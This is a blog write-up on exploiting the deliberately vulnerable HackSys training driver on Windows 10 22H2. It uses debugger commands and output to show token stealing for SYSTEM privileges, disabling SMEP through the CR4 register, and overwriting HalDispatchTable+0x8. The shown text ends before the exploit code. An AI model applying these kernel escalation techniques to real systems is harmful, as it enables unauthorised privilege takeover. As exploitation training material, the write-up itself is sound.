Neue",sans-serif;font-size:24px;font-weight:900;line-height:42px;border-radius:8px;border:4px solid rgba(238,238,238,.1);transition:all .3s;color:#fff;background-color:rgba(0,0,0,0)}.search__group .search__text::-webkit-input-placeholder{font-weight:900;color:rgba(238,238,238,.8)}.search__group .search__text::placeholder{font-weight:900;color:rgba(238,238,238,.8)}.search__group .search__text::-ms-clear{display:none}.search__group .search__text:focus{color:#eee;background:#09080f}@media only screen and (max-width: 576px){.search__group .search__text{font-size:26px}}.search-results-list .no-results{width:100%;list-style:none}.search-results-list .no-results h3{font-size:28px;text-align:center}.load-more{margin:0 auto}.load-more-section{margin:30px auto;text-align:center}@media only screen and (max-width: 576px){.load-more-section{margin:20px auto}}.footer-widgets{padding:64px 0 32px}.footer-widgets .row .col{flex-grow:1}@media only screen and (max-width: 768px){.footer-widgets{padding:48px 0 0}}.widget{margin-bottom:40px}@media only screen and (max-width: 768px){.widget{margin-bottom:64px}}.widget__title{position:relative;padding-left:8px;margin-bottom:36px;font-size:24px;line-height:1;color:#fff}.widget__title::after{content:"";position:absolute;left:0;top:50%;z-index:-1;transform:translateY(-50%);display:block;width:106px;height:38px;border-radius:4px 0px 0px 4px;background:linear-gradient(90deg, #ff7b7b -5.19%, rgba(15, 14, 21, 0) 100%)}@media only screen and (max-width: 992px){.widget__title{font-size:24px}}.recent-posts{display:flex;align-items:center;margin-bottom:20px}.recent-posts:last-child{margin-bottom:0}@media only screen and (max-width: 360px){.recent-posts{flex-wrap:wrap;margin-bottom:32px}}.recent-posts__image{position:relative;display:block;width:100%;max-width:174px;height:144px;margin-right:20px;border-radius:16px;overflow:hidden;background:#09080f}.recent-posts__image img{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:16px;object-fit:cover}@media only screen and (max-width: 360px){.recent-posts__image{height:auto;max-width:100%;padding-top:56.6%;margin:0 0 20px}}.recent-posts__content .recent-posts__title{font-size:18px;margin:8px 0}.recent-posts__content .article__author-image{width:28px;height:28px}.tag__cloud{display:flex;flex-wrap:wrap}.tag__cloud a{display:inline-block;padding:8px 16px;margin:0 5px 5px 0;font-size:12px;line-height:10px;font-weight:700;text-transform:capitalize;border:3px solid rgba(255,255,255,.1);border-radius:24px;color:#aaa}.tag__cloud a:hover{border-color:#ff7b7b;color:#fff}.subscribe-subtitle{width:100%;margin-bottom:24px;font-size:16px;line-height:24px;color:#aaa}.subscribe-group-top{display:flex;align-items:center}.subscribe-group-top .subscribe-email{position:relative;width:100%;height:56px;padding:20px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:14px;line-height:20px;font-weight:700;border-radius:8px;color:#fff;background-color:#17151e;border:2px solid rgba(0,0,0,0);outline:0;-webkit-appearance:none;box-sizing:border-box;transition:border-color .2s ease-in-out;cursor:text}.subscribe-group-top .subscribe-email::placeholder{color:#eee}.subscribe-group-top .subscribe-email:focus{color:#fff;border-color:#ff7b7b}.subscribe-group-top .subscribe-button{margin-left:10px}.footer{position:relative;padding:64px 0;border-top:2px solid #09080f}.footer .footer__inner{display:flex;justify-content:space-between;align-items:center}@media only screen and (max-width: 992px){.footer .footer__inner{flex-direction:column}.footer .footer__inner .copyright{order:1}}@media only screen and (max-width: 768px){.footer .footer__inner{align-items:flex-start}}.copyright{font-size:13px;color:#aaa}.copyright a{font-weight:500;color:#fff}.copyright a:hover{color:#ff7b7b}.social{text-align:center}.social .social__list{display:flex;flex-wrap:wrap;justify-content:center;align-items:center}.social .social__item{display:inline-block;margin-left:8px}.social .social__item:first-child{margin-left:0}.social .social__link{display:flex;justify-content:center;align-items:center;width:40px;height:40px;font-size:16px;line-height:40px;border-radius:8px;color:#fff;background-color:#17151e}.social .social__link:hover{color:#09080f;background-color:#ff7b7b}@media only screen and (max-width: 992px){.social{margin-bottom:5px}.social .social__item{margin-bottom:10px}.social .social__link{width:30px;height:30px;line-height:30px;font-size:16px}}.button{display:inline-block;white-space:nowrap;vertical-align:middle;font:inherit;border:none;border-radius:8px;outline:none;-webkit-appearance:none;text-align:center;text-decoration:none;color:#fff;transition:all .2s ease;cursor:pointer}.button:hover{color:#fff}.button--primary{padding:20px 40px;font-size:16px;font-weight:700;line-height:1;background-color:#17151e}.button--primary:hover{color:#09080f;background-color:#ff6262}.button--middle{position:relative;padding:24px 48px;width:100%;max-width:412px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase;transition:all .2s ease;background-color:#09080f}.button--middle:hover{background-color:#17151e}.button--big{display:block;width:100%}.article{align-items:stretch;flex-grow:1;min-height:340px;margin-bottom:32px;transition:transform .2s ease}.article::after{content:"";display:table;padding-top:25%}.article:hover{transform:translateY(-5px)}.article--big::after{padding-top:35%}@media only screen and (max-width: 992px){.article--big::after{padding-top:25%}}@media only screen and (max-width: 576px){.article{min-height:280px}}.article__inner{position:relative;display:flex;width:100%;height:100%;border-radius:16px;overflow:hidden;box-shadow:0 5px 10px 0 rgba(0,0,0,.5);background-color:#09080f}.article__inner .featured-post{position:absolute;top:20px;right:32px;z-index:10;padding:2px 4px;font-size:20px;border-radius:4px;color:#aaa;background:rgba(255,255,255,.08);pointer-events:none}@media only screen and (max-width: 576px){.article__inner .featured-post{right:20px}}.article__title{margin:12px 0 12px;font-size:28px;line-height:1}.article__title a{color:#eee}@media only screen and (max-width: 576px){.article__title{font-size:24px}}.article__excerpt{margin-bottom:12px;font-size:14px;line-height:17px;color:#aaa}@media only screen and (max-width: 576px){.article__excerpt{font-size:13px}}.article__image{position:absolute;display:block;width:100%;height:100%;overflow:hidden;user-select:none;background-color:#09080f}.article__image::after{content:"";display:block;position:absolute;top:0;left:0;width:100%;height:100%;background-color:rgba(15,14,21,.6);pointer-events:none}.article__image img{position:absolute;top:0;width:100%;height:100%;object-fit:cover;border-radius:16px;pointer-events:none}.article__content{z-index:1;width:100%;margin-top:auto;padding:0 32px 32px;pointer-events:none}@media only screen and (max-width: 576px){.article__content{padding:20px}}.article__meta{line-height:12px}.article__meta .article__date,.article__meta .article__minutes{font-size:12px;line-height:1;font-weight:500}.article__meta .article__date{color:#aaa}.article__bottom{display:flex;align-items:center;font-size:12px;line-height:18px;font-weight:500;color:#fff}.article__bottom a{pointer-events:all}.article-tags .article__tag{display:inline-block;padding:4px 8px;margin:2px 0;font-size:12px;line-height:10px;font-weight:500;text-transform:capitalize;letter-spacing:-0.5px;border:2px solid rgba(255,255,255,.4);border-radius:24px;color:#aaa}.article-tags .article__tag:hover{color:#fff;border-color:#ff7b7b}.article__author{float:left;flex-shrink:0}.article__author-image{position:relative;display:inline-block;width:36px;height:36px;padding:3px;margin-right:8px;border:2px solid #ff7b7b;border-radius:50%;overflow:hidden}.article__author-image img{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.article__author-link{font-size:12px;color:#fff}.article__author-link:hover{color:#fff}.article__author span{color:rgba(255,255,255,.8)}.post,.page{position:relative;max-width:760px;margin:0 auto}.post-head{margin-bottom:64px}.post-head .row{align-items:center}.post-head .post-head__box{margin-left:32px}@media only screen and (max-width: 992px){.post-head .post-head__box{margin-left:16px}}@media only screen and (max-width: 768px){.post-head{margin-bottom:40px}.post-head .post-head__box{margin-left:0}.post-head .row{flex-direction:column}}.post-image{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:16px;object-fit:cover}.image-box{position:relative;padding-top:90%;min-height:280px;border-radius:16px;overflow:hidden;box-shadow:0 5px 10px 0px rgba(0,0,0,.15);background-color:#09080f}@media only screen and (max-width: 768px){.image-box{padding-top:65%;margin-bottom:40px}}.post__meta{line-height:13px}.post__meta .post__date,.post__meta .post__minutes{font-size:13px;line-height:1;font-weight:500}.post__meta .post__date{color:#aaa}.post__title{margin:20px 0 20px;font-size:56px;line-height:1}@media only screen and (max-width: 1200px){.post__title{font-size:40px}}@media only screen and (max-width: 576px){.post__title{font-size:32px}}.post__bottom{display:flex;align-items:center;font-size:13px;line-height:30px;font-weight:500;color:#fff}.post-tags .post__tag{padding:4px 8px;margin:2px 0;font-size:12px;line-height:10px;font-weight:700;border:2px solid rgba(255,255,255,.2);border-radius:24px;color:#aaa}.post-tags .post__tag:hover{color:#fff;border-color:#ff7b7b}.post__author{float:left;flex-shrink:0}.post__author-image{position:relative;display:inline-block;width:36px;height:36px;padding:3px;margin-right:8px;border:2px solid #ff7b7b;border-radius:50%;overflow:hidden}.post__author-image img{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.post__author-link{font-size:13px;color:#fff}.post__author-link:hover{color:#fff}.post__author span{color:rgba(255,255,255,.8)}.post__content,.page__content{color:#aaa}.post__content a,.page__content a{border-bottom:2px solid rgba(238,238,238,.1)}.post__content a:hover,.page__content a:hover{border-color:#ff7b7b;color:#eee;text-decoration:none}.post__share{display:flex;justify-content:center;margin:64px 0}.post__share .share__list{display:inline-flex;justify-content:center;align-items:center;border-radius:16px;background:#17151e}.post__share .share__list .share__link{position:relative;display:flex;justify-content:center;align-items:center;padding:28px 24px;font-size:20px;color:#eee;transition:all .2s}.post__share .share__list .share__link:first-child{padding-left:48px}.post__share .share__list .share__link:first-child::after{content:none}.post__share .share__list .share__link:last-child{padding-right:48px}.post__share .share__list .share__link::after{content:"";position:absolute;left:0;display:block;width:1px;height:12px;background:rgba(238,238,238,.08)}.post__share .share__list .share__link:hover{color:#ff7b7b}@media only screen and (max-width: 576px){.post__share{margin:48px 0}.post__share .share__list .share__link{padding:24px 20px}.post__share .share__list .share__link:first-child{padding-left:40px}.post__share .share__list .share__link:last-child{padding-right:40px}}.post__navigation{display:flex;justify-content:space-between;margin-bottom:64px;box-shadow:0 5px 10px 0 rgba(0,0,0,.5);border-radius:16px}.post__navigation .prev,.post__navigation .prev img{border-radius:16px 0 0 16px}.post__navigation .next,.post__navigation .next img{border-radius:0 16px 16px 0}.post__navigation .prev,.post__navigation .next{position:relative;display:flex;align-items:flex-end;width:100%;min-height:240px;padding:0 32px 32px;overflow:hidden;background-size:cover;background-position:center;background-repeat:no-repeat;background-color:#09080f;user-select:none}.post__navigation .prev::after,.post__navigation .next::after{content:"";display:block;position:absolute;top:0;left:0;width:100%;height:100%;background-color:rgba(9,8,15,.6);pointer-events:none;transition:.25s}.post__navigation .prev:hover::after,.post__navigation .next:hover::after{background-color:rgba(9,8,15,.7)}.post__navigation .prev .post__nav,.post__navigation .next .post__nav{display:inline-block;margin-bottom:8px;font-size:12px;font-weight:500;text-transform:uppercase;color:#eee}.post__navigation .prev .post__nav-image,.post__navigation .next .post__nav-image{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.post__navigation .prev .post__nav-box,.post__navigation .next .post__nav-box{position:relative;z-index:1;width:100%}.post__navigation .prev .post__nav__prev i,.post__navigation .next .post__nav__prev i{margin-right:4px}.post__navigation .prev .post__nav__next i,.post__navigation .next .post__nav__next i{margin-left:4px}.post__navigation .prev .post__nav__title,.post__navigation .next .post__nav__title{margin-bottom:0;font-size:24px;line-height:1}.post__navigation .prev .post__nav__title a,.post__navigation .next .post__nav__title a{color:#eee}.post__navigation .next{text-align:right;margin-left:auto}@media only screen and (max-width: 768px){.post__navigation{flex-wrap:wrap;box-shadow:none}.post__navigation .prev,.post__navigation .next{width:100%;border-radius:16px;box-shadow:0 5px 10px 0 rgba(0,0,0,.5)}.post__navigation .prev img,.post__navigation .next img{border-radius:16px}.post__navigation .prev{margin-bottom:20px}}@media only screen and (max-width: 576px){.post__navigation{margin-bottom:48px}}.related-posts{display:none}.related-posts.is-related{display:block}.related-posts .related-title{position:relative;padding-left:8px;margin-bottom:36px;font-size:24px;line-height:1;color:#fff}.related-posts .related-title::after{content:"";position:absolute;left:0;top:50%;z-index:-1;transform:translateY(-50%);display:block;width:106px;height:38px;border-radius:4px 0px 0px 4px;background:linear-gradient(90deg, #ff7b7b -5.19%, rgba(15, 14, 21, 0) 100%)}@media only screen and (max-width: 992px){.related-posts .related-title{font-size:24px}}.disqus-inner{border-radius:16px;background:#17151e}.post-comments{max-width:824px;padding:64px 32px;margin:0 auto}@media only screen and (max-width: 576px){.post-comments{padding:48px 32px}}.archive-box{position:relative;margin:50px 0 80px;text-align:center}@media only screen and (max-width: 576px){.archive-box{margin:20px 0 50px}}.archive-meta{font-size:16px;color:rgba(238,238,238,.6)}.archive-title{position:relative;margin:0;font-size:47px;line-height:57px;text-transform:capitalize}@media only screen and (max-width: 576px){.archive-title{font-size:40px;line-height:52px}}.archive-description{max-width:600px;margin:10px auto 0;font-size:16px;line-height:32px}@media only screen and (max-width: 576px){.archive-description{margin:5px auto 0;line-height:28px}}.form__group{margin-bottom:20px}.form__input{width:100%;padding:20px;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:16px;font-weight:700;border:2px solid rgba(0,0,0,0);border-radius:8px;color:#eee;background:#17151e;transition:border-color .2s ease-in-out}.form__input::placeholder{color:#fff}.form__input:focus{border-color:#ff7b7b}textarea{resize:vertical}
  </style>
</head>


<body>
  

  

<!-- begin header -->
<header class="header ">
  <div class="container">
    <div class="row">
      <div class="header__inner col col-12">

      <div class="logo">
        <a class="logo__link" href="/">
        
          0Dr3f
        
        </a>
      </div>
        
      <div class="menu-overlay">
        <nav class="main-nav">
          <div class="main-nav__box">
            <div class="nav__icon-close">
              <i class="ion ion-md-close"></i>
            </div>
            <div class="nav-grid">
              <div class="nav-grid__item">
                <h2 class="nav-grid__title">Menu</h2>
                <div class="mobile-nav">
                  <ul class="nav__list list-reset">
  <li class="nav__item">
    <a href="/" class="nav__link">Home</a>
  </li>
  
    
  
    
      
      <li class="nav__item">
        <a href="/cve/" class="nav__link">Public CVEs</a>
      </li>
      
    
  
    
      
      <li class="nav__item">
        <a href="/contact/" class="nav__link">Contact</a>
      </li>
      
    
  
    
      
      <li class="nav__item">
        <a href="/policy/" class="nav__link">Disclosure Policy</a>
      </li>
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
</ul>

                </div>
              </div>
            </div>
          </div>
        </nav>
      </div>

      <div class="navigation">
        <div class="top-nav">
          <ul class="nav__list list-reset">
  <li class="nav__item">
    <a href="/" class="nav__link">Home</a>
  </li>
  
    
  
    
      
      <li class="nav__item">
        <a href="/cve/" class="nav__link">Public CVEs</a>
      </li>
      
    
  
    
      
      <li class="nav__item">
        <a href="/contact/" class="nav__link">Contact</a>
      </li>
      
    
  
    
      
      <li class="nav__item">
        <a href="/policy/" class="nav__link">Disclosure Policy</a>
      </li>
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
</ul>

        </div>
      </div>

      <div class="nav-buttons">
        <i class="nav__icon nav__icon-menu ion ion-md-menu"></i>
        <div class="search-button">
          <i class="nav__icon nav__icon-search ion ion-md-search"></i>
          <span>Search</span>
        </div>
      </div>

      </div>
    </div>
  </div>
</header>
<!-- end header -->

<!-- begin search -->
<div class="search">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="search__box">
          <div class="search__group">
            <div class="search__close">
              <i class="ion ion-md-close"></i>
            </div>
            <label for="js-search-input" class="screen-reader-text">Search for Blog</label>
            <input type="text" id="js-search-input" class="search__text" autocomplete="off" placeholder="Type to search...">
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="container">
    <div class="row search-results-list" id="js-results-container"></div>
  </div>

</div>
<!-- end search -->

  <!-- begin content -->
  <main class="content" aria-label="Content">
    <div class="post-head">
  <div class="container">
    <div class="row">
      
      <div class="col col-6 col-t-12">
        <div class="image-box">
          <img class="post-image lazy" data-src="/images/post_01.png" alt="HEVD on Win10 22H2 - Arbitrary Overwrite">
        </div>
      </div>
      
  
      <div class="col col-6 col-t-12">
        <div class="post-head__box">
        
          <div class="post__meta">
            <span class="post__minutes">
              
              
                38 min read
              
              <time class="post__date"
                datetime="2023-07-14T15:40:00+02:00">Jul 14, 2023</time>
            </span>
          </div>
        
          <h2 class="post__title">HEVD on Win10 22H2 - Arbitrary Overwrite</h2>
        
          <div class="post__bottom">
        
            <div class="post__author">
              <a href="/contact/" aria-label="0Dr3f"><img class="post__author-image"
                  src="/images/0Dr3f_logo.png" alt="0Dr3f's Picture"></a>
            </div>
        
            <div class="post__bottom-meta">
              <a href="/contact/" class="post__author-link">0Dr3f</a>
              
              <span>in</span>
              <span class="post-tags">
                
                <a href="/tag/KERNEL" class="post__tag">KERNEL</a>
                
                <a href="/tag/POC" class="post__tag">POC</a>
                
              </span>
              
            </div>
          </div>
        
        </div>
      </div>
    </div>
  </div>
</div>

<!-- begin post -->
<div class="container">
  <article class="post animate">

    <div class="post__content">
      <h2 id="introduction">Introduction</h2>
<p>In order to get used to more modern kernel exploit mitigations, I decided to start digging into the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSys Extreme Vulnerable Driver</a> on an up-to-date version (22H2) of Windows 10. This post covers the thought-process, techniques used, and obstacles faced when exploiting an arbitrary write vulnerability on Windows 10 22H2.</p>

<h2 id="token-stealing">Token stealing</h2>
<p>In order to elevate the privileges of a process in windows, we will be using a concept called token stealing. Every process in windows has an <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens">Access Token</a>. If we attach a kernel debugger we can find this token in a structure called the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS</span> structure at <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS+0x4b8</span></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; dt nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x438 ProcessLock      : _EX_PUSH_LOCK
   +0x440 UniqueProcessId  : Ptr64 Void
...
   +0x4b0 ExceptionPortState : Pos 0, 3 Bits
   +0x4b8 Token            : _EX_FAST_REF
</code></pre></div></div>

<p>Using <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">!process</span>, we can find the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS</span> address of a process, after which we can see the contents of the access token.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; !process 0 0 system
PROCESS ffffdf88bce5d040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffcb02d9443c80  HandleCount: 2835.
    Image: System

0: kd&gt; dt _EX_FAST_REF ffffdf88bce5d040+0x4b8
nt!_EX_FAST_REF
   +0x000 Object           : 0xffffcb02`d948c6ae Void
   +0x000 RefCnt           : 0y1110
   +0x000 Value            : 0xffffcb02`d948c6ae
</code></pre></div></div>

<p>As we can see the token is stored as a <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EX_FAST_REF</span> struct. This refers to the ‘Executive Fast Reference’ union which is something that stores data types at the same memory location. As we can see, the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EX_FAST_REF</span> offsets remain the same for all data types within the structure.</p>

<p>By applying this knowledge, token stealing is nothing more than grabbing the value which exists at <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">[_EPROCESS+0x4b8]</span> and copying it to another <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">[_EPROCESS+0x4b8]</span>. In order to check if these claims are correct, we can simulate this in a kernel debugger.</p>

<p>First we open a command prompt.
<img src="/images/Pasted%20image%2020230708134239.png" alt="" /></p>

<p>Next, we grab the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS</span> of both the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">cmd.exe</span> and <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">system</span> process.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; !process 0 0 cmd.exe
PROCESS ffffdf88c4ca0080
    SessionId: 1  Cid: 1cc8    Peb: 686edd000  ParentCid: 10d8
    DirBase: b0291000  ObjectTable: ffffcb02df0e8d80  HandleCount:  74.
    Image: cmd.exe

0: kd&gt; !process 0 0 system
PROCESS ffffdf88bce5d040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffcb02d9443c80  HandleCount: 2878.
    Image: System
</code></pre></div></div>

<p>And finally, we write the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">system</span> token value to the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">cmd.exe</span> token location.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; eq ffffdf88c4ca0080+4b8 poi(ffffdf88bce5d040+4b8)
</code></pre></div></div>

<p><img src="/images/Pasted%20image%2020230708134636.png" alt="" /></p>

<p>Thats it, you have now performed token stealing! But in order to be able to apply this same technique in code, we need to be able to get a reference to the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS</span> structure.</p>

<p>On 64-bit windows, we can use something called the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">GS</span> segment register. This register holds a pointer to the  <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_ETHREAD / _KTHREAD</span> at  <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">GS:[0x188]</span>.</p>

<p><strong>note</strong>: Just like the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS / _KPROCESS</span> structures, the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_ETHREAD / _KTHREAD</span> structures reside at the same address but just use different offsets.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; ? poi(gs:[0x188])
Evaluate expression: -8770215056896 = fffff806`06726a00

0: kd&gt; !thread
THREAD fffff80606726a00  Cid 0000.0000  Teb: 0000000000000000 Win32Thread: 0000000000000000 RUNNING on processor 0
...
Owning Process            fffff80606723a00       Image:         Idle
</code></pre></div></div>

<p>As we can see, when we use the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">!thread</span> command, it matches with the address pointed to by <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">GS:[0x188]</span> aswell as give us the owning process of the current thread. Looking at the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_KTHREAD</span> structure, it holds something called the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">ApcState</span> at <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_KTHREAD+0x098</span>.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; dt nt!_KTHREAD poi(gs:[0x188])
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
...
   +0x098 ApcState         : _KAPC_STATE
   +0x098 ApcStateFill     : [43]  "???"
</code></pre></div></div>

<p>If we have a look inside this structure, we can see that it actually holds a reference to the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_KPROCESS</span> structure at <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_KAPC_STATE+0x20</span>, which as we noted earlier resides at the same address as the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS</span> structure.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; dt nt!_KAPC_STATE poi(gs:[0x188])+0x98
   +0x000 ApcListHead      : [2] _LIST_ENTRY [ 0xfffff806`06726a98 - 0xfffff806`06726a98 ]
   +0x020 Process          : 0xffffdf88`bce5d040 _KPROCESS
   +0x028 InProgressFlags  : 0 ''
...
</code></pre></div></div>

<p>So what does this give us?</p>

<p>This means we can use <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">poi ( GS:[0x188] )</span> to get a pointer to the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_ETHREAD / _KTHREAD</span>. And use <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">poi ( _KTHREAD+0xb8 )</span> (0x98 + 0x20) to get a pointer to the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS / _KPROCESS</span>. Basically, <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">poi ( poi ( GS:[0x188] ) + 0xb8 )</span> should always give us the current <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_EPROCESS</span> address, through code.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PROCESS ffffdf88bce5d040
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001ad000  ObjectTable: ffffcb02d9443c80  HandleCount: 3067.
    Image: System

0: kd&gt; ? poi ( poi ( GS:[0x188] ) + 0xb8 )
Evaluate expression: -35696598986688 = ffffdf88`bce5d040
</code></pre></div></div>

<h2 id="smep--smap">SMEP &amp; SMAP</h2>
<p>Now that we know how to steal access tokens through code, we have to talk about the first obstacle we will encounter which is called <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">Supervisor Mode Execution Prevention</a> or SMEP and Supervisor Mode Access Prevention or SMAP. In a nutshell, these protections were created to prevent <strong>userland</strong> code/data to be executed/accessed from the <strong>kernel</strong>. If we look at many of the available HEVD writeups for windows 7, a valid attack flow would be:</p>
<ul>
  <li>Create a buffer containing shellcode</li>
  <li>Overwrite some pointer that is called from the kernel with the pointer to your buffer</li>
  <li>Profit</li>
</ul>

<p>SMEP now prevents this, because the <strong>userland</strong> allocated buffer is not executable from the <strong>kernel</strong>.</p>

<h3 id="how-do-we-bypass-smep">How do we bypass SMEP?</h3>
<p>SMEP and SMAP are enforced through the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">CR4</span> register. In fact, the 21st and 20th bit of the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">CR4</span> register.</p>

<p><strong>note</strong>: Take endianness into account here, start counting from the right.</p>

<p><img src="/images/Pasted%20image%2020230708144940.png" alt="" /></p>

<p>If we want to disable SMEP, we simply need to set the 20th bit of the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">CR4</span> register to 0.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; .formats 0y0000000000000000000000000000000000000000001001010000111011111000
Evaluate expression:
  Hex:     00000000`00250ef8
</code></pre></div></div>

<p>Thus, changing <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">CR4</span> to <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">0x250ef8</span> would disable SMEP.</p>

<h2 id="arbitrary-write">Arbitrary write</h2>
<p>Now that we know what to do, lets see what we’re dealing with. The vulnerability within HEVD we are targeting is an arbitrary write, meaning we can write what we want wherever we want. We need to find a location within the kernel that upon writing specific value(s) to, allows us to eventually steal the system token.</p>

<h2 id="haldispatchtable">HalDispatchTable</h2>
<p>The HalDispatchTable is a table of pointers related to HAL functionality within the windows kernel of which its location is a static offset from the kernel base address.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; dps nt!HalDispatchTable 
fffff806`06600a60  00000000`00000004
fffff806`06600a68  fffff806`0638f9d0 nt!HaliQuerySystemInformation
fffff806`06600a70  fffff806`0612ad60 nt!HalpSetSystemInformation
fffff806`06600a78  fffff806`0611d780 nt!ArbAddReserved
fffff806`06600a80  00000000`00000000
fffff806`06600a88  fffff806`0628dd20 nt!HalExamineMBR
fffff806`06600a90  fffff806`0628dee0 nt!IoReadPartitionTable
fffff806`06600a98  fffff806`0628e160 nt!IoSetPartitionInformation
fffff806`06600aa0  fffff806`0628e3b0 nt!IoWritePartitionTable
fffff806`06600aa8  fffff806`05c53f00 nt!SC_DEVICE::GetStoragePropertyPost
fffff806`06600ab0  fffff806`05d99f00 nt!EmpCheckErrataList
fffff806`06600ab8  fffff806`05d99f00 nt!EmpCheckErrataList
fffff806`06600ac0  fffff806`0619b830 nt!HaliInitPnpDriver
fffff806`06600ac8  fffff806`061a3200 nt!HaliInitPowerManagement
fffff806`06600ad0  fffff806`05d78e90 nt!HalPnpGetDmaAdapter
fffff806`06600ad8  fffff806`061ca790 nt!HaliGetInterruptTranslator
</code></pre></div></div>

<h3 id="haldispatchtable--0x8">HalDispatchTable + 0x8</h3>
<p>A common method for kernel exploitation is to overwrite <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HalDispatchTable+0x8</span> with a pointer to a buffer containing shellcode. The <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HalDispatchTable+0x8</span> offset points to the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">nt!HaliQuerySystemInformation</span> function which, if we look in the disassembler, is referenced by <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">KeQueryIntervalProfile</span>.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0: kd&gt; ? nt!HalDispatchTable - nt
Evaluate expression: 12585568 = 00000000`00c00a60
</code></pre></div></div>

<p><img src="/images/Pasted%20image%2020230710062711.png" alt="" /></p>

<p><img src="/images/Pasted%20image%2020230710062932.png" alt="" /></p>

<p>Checking the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">_guard_dispatch_icall</span> function, we can see that it jumps to the function loaded in <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RAX</span>.</p>

